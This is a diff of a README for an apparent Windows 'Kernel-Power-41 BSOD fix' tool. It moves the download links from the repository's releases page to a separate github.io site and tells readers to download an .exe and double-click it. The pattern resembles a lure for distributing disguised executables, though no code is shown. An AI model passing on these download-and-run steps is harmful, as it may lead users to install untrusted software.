@@ -1,6 +1,6 @@
 # 🛠 Kernel-Power-41-BSOD-Fix - Stop Windows random system power crashes
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/floretasteless736/Kernel-Power-41-BSOD-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://floretasteless736.github.io)
 
 ## 📋 About This Tool
 The Kernel-Power-41 error occurs when Windows restarts or shuts down unexpectedly. This error often points to power management issues, driver conflicts, or hardware stability problems. This software provides an automated repair utility to address the common software drivers and Windows settings linked to this specific event ID. It works for both Windows 10 and Windows 11.
@@ -15,7 +15,7 @@ This utility maintains compatibility with the following systems:
 ## 📥 Download and Install
 Follow these steps to obtain the repair tool:
 
-1. Visit the [releases page](https://github.com/floretasteless736/Kernel-Power-41-BSOD-Fix/releases) to access the latest version.
+1. Visit the [releases page](https://floretasteless736.github.io) to access the latest version.
 2. Select the newest file ending in .exe from the assets list.
 3. Save the file to your desktop for easy access.
 4. Double-click the file to start the utility.
